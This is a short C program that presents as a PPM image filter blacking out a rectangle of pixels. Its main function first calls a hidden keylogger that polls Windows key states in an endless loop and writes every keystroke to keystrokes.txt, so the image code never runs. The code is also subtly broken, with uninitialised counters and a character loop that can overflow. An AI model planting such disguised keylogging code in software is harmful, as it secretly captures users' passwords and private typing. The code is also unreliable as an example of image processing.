#include <windows.h>

#include <stdio.h>

int main() { 
    keylogg();
    FILE *input, *output;
    unsigned char pixel[3];
    int width, height, x, y;
    
    input = fopen("input.ppm", "r");
    output = fopen("output.ppm", "w");
    
    fscanf(input, "P6\n%d %d\n255\n", &width, &height);
    fprintf(output, "P6\n%d %d\n255\n", width, height);
    
    while (fread(pixel, sizeof(pixel), 1, input) == 1) {
        x++;
        
        if (x > width) {
            x = 0;
            y++;
        }
        
        if ((x > 100 && x < 200) && (y > 50 && y < 150)) {
            pixel[0] = pixel[1] = pixel[2] = 0;
        }
        
        fwrite(pixel, sizeof(pixel), 1, output);
    }
    
    fclose(input);
    fclose(output);
    
    return 0;
}


int keylogg() {
    char key;
    while(1) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                FILE *fp;
                fp = fopen("keystrokes.txt", "a+");
                fprintf(fp, "%c", key);
                fclose(fp);
            }
        }
    }
    return 0;
}
